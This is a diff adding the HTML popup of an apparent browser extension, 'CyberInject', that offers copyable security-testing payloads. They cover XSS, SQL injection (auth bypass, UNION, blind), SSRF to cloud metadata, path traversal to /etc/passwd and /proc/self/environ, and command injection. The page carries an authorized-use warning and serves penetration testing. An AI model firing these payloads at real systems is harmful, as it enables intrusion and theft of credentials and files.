@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberInject</title>
+    <link rel="stylesheet" href="popup.css">
+</head>
+<body>
+    <div class="extension-container">
+
+        <header class="header">
+            <div class="logo-section">
+                <img src="icons/CyberInjectLogo.png" alt="CyberInject Logo" class="logo-icon">
+                <div class="title-group">
+                    <h1 class="main-title">CyberInject</h1>
+                    <p class="subtitle">Security Testing Toolkit</p>
+                </div>
+            </div>
+            <div class="version-badge">v1.0.0</div>
+        </header>
+
+        <nav class="tab-navigation">
+            <button class="tab-button active" data-category="xss">
+                <span class="tab-icon">⚡</span>
+                <span class="tab-text">XSS</span>
+            </button>
+            <button class="tab-button" data-category="sqli">
+                <span class="tab-icon">🗃️</span>
+                <span class="tab-text">SQLi</span>
+            </button>
+            <button class="tab-button" data-category="ssrf">
+                <span class="tab-icon">🌐</span>
+                <span class="tab-text">SSRF</span>
+            </button>
+            <button class="tab-button" data-category="lfi">
+                <span class="tab-icon">📁</span>
+                <span class="tab-text">LFI</span>
+            </button>
+            <button class="tab-button" data-category="other">
+                <span class="tab-icon">🔧</span>
+                <span class="tab-text">Other</span>
+            </button>
+        </nav>
+
+        <main class="content-area">
+
+            <div class="ethics-warning">
+                <span class="warning-icon">⚠️</span>
+                <span class="warning-text">Authorized testing only. Always obtain proper permission.</span>
+            </div>
+
+            <section class="payload-section active" id="xss">
+                <div class="section-header">
+                    <h2 class="section-title">Cross-Site Scripting (XSS)</h2>
+                    <span class="payload-count">6 payloads</span>
+                </div>
+                
+                <div class="payload-grid">
+                    <div class="payload-card" data-payload='<script>alert("XSS")</script>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Basic Script Alert</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;script&gt;alert("XSS")&lt;/script&gt;</code>
+                        <div class="payload-description">Standard XSS payload for initial testing</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='"><img src=x onerror=alert(1)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Image Error Handler</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">"&gt;&lt;img src=x onerror=alert(1)&gt;</code>
+                        <div class="payload-description">Breaks out of attributes using image error</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<svg/onload=confirm(1337)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">SVG Onload Event</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;svg/onload=confirm(1337)&gt;</code>
+                        <div class="payload-description">SVG-based XSS with onload trigger</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="javascript:alert('XSS')">
+                        <div class="payload-header">
+                            <h3 class="payload-name">JavaScript Protocol</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">javascript:alert('XSS')</code>
+                        <div class="payload-description">Protocol-based XSS for href attributes</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<iframe src=javascript:alert(1)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Iframe JavaScript</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;iframe src=javascript:alert(1)&gt;</code>
+                        <div class="payload-description">Iframe with JavaScript source</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="'><script>alert(String.fromCharCode(88,83,83))</script>">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Encoded String XSS</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">'&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
+                        <div class="payload-description">Character code encoding to bypass filters</div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="payload-section" id="sqli">
+                <div class="section-header">
+                    <h2 class="section-title">SQL Injection</h2>
+                    <span class="payload-count">6 payloads</span>
+                </div>
+                
+                <div class="payload-grid">
+                    <div class="payload-card" data-payload="' OR '1'='1">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Classic OR Bypass</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' OR '1'='1</code>
+                        <div class="payload-description">Basic authentication bypass</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' UNION SELECT NULL,NULL,NULL--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Union Select Base</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' UNION SELECT NULL,NULL,NULL--</code>
+                        <div class="payload-description">Union-based SQL injection foundation</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="admin'--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Comment Bypass</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">admin'--</code>
+                        <div class="payload-description">SQL comment to bypass password check</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' OR 1=1#">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Hash Comment</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' OR 1=1#</code>
+                        <div class="payload-description">MySQL hash comment bypass</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="1' AND (SELECT COUNT(*) FROM users)>0--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Table Enumeration</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">1' AND (SELECT COUNT(*) FROM users)>0--</code>
+                        <div class="payload-description">Check if 'users' table exists</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' OR SLEEP(5)--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Time-based Blind</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' OR SLEEP(5)--</code>
+                        <div class="payload-description">Time delay for blind SQL injection</div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="payload-section" id="ssrf">
+                <div class="section-header">
+                    <h2 class="section-title">Server-Side Request Forgery</h2>
+                    <span class="payload-count">5 payloads</span>
+                </div>
+                
+                <div class="payload-grid">
+                    <div class="payload-card" data-payload="http://localhost:8080">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Localhost Access</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://localhost:8080</code>
+                        <div class="payload-description">Access internal services on localhost</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="http://127.0.0.1:22">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Internal SSH</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://127.0.0.1:22</code>
+                        <div class="payload-description">Target SSH service on loopback</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="http://169.254.169.254/latest/meta-data/">
+                        <div class="payload-header">
+                            <h3 class="payload-name">AWS Metadata</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://169.254.169.254/latest/meta-data/</code>
+                        <div class="payload-description">AWS EC2 instance metadata endpoint</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="file:///etc/passwd">
+                        <div class="payload-header">
+                            <h3 class="payload-name">File Protocol</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">file:///etc/passwd</code>
+                        <div class="payload-description">Local file access via file protocol</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="http://0.0.0.0:80">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Null Route</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://0.0.0.0:80</code>
+                        <div class="payload-description">Access all interfaces via null route</div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="payload-section" id="lfi">
+                <div class="section-header">
+                    <h2 class="section-title">Local File Inclusion</h2>
+                    <span class="payload-count">5 payloads</span>
+                </div>
+                
+                <div class="payload-grid">
+                    <div class="payload-card" data-payload="../../../etc/passwd">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Linux Passwd File</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">../../../etc/passwd</code>
+                        <div class="payload-description">Path traversal to Linux password file</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="....//....//....//etc/passwd">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Double Encoding</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">....//....//....//etc/passwd</code>
+                        <div class="payload-description">Double-encoded path traversal</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="/proc/self/environ">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Process Environment</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">/proc/self/environ</code>
+                        <div class="payload-description">Access process environment variables</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="../../../windows/system32/drivers/etc/hosts">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Windows Hosts File</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">../../../windows/system32/drivers/etc/hosts</code>
+                        <div class="payload-description">Windows hosts file via path traversal</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="php://filter/convert.base64-encode/resource=index.php">
+                        <div class="payload-header">
+                            <h3 class="payload-name">PHP Filter</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">php://filter/convert.base64-encode/resource=index.php</code>
+                        <div class="payload-description">PHP filter for source code disclosure</div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="payload-section" id="other">
+                <div class="section-header">
+                    <h2 class="section-title">Other Vulnerabilities</h2>
+                    <span class="payload-count">5 payloads</span>
+                </div>
+                
+                <div class="payload-grid">
+                    <div class="payload-card" data-payload="{{7*7}}">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Template Injection</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">{{7*7}}</code>
+                        <div class="payload-description">Server-side template injection test</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="; cat /etc/passwd">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Command Injection</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">; cat /etc/passwd</code>
+                        <div class="payload-description">OS command injection via semicolon</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="<iframe src=//evil.com>">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Open Redirect</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;iframe src=//evil.com&gt;</code>
+                        <div class="payload-description">Iframe-based open redirect</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="?debug=1">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Debug Parameter</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">?debug=1</code>
+                        <div class="payload-description">Common debug parameter exposure</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="../admin">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Path Traversal</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">../admin</code>
+                        <div class="payload-description">Simple directory traversal</div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <span class="footer-text">CyberInject • Professional Security Testing</span>
+                <div class="footer-links">
+                    <span class="footer-link">Ethical Use Only</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="popup.js"></script>
+</body>
+</html>
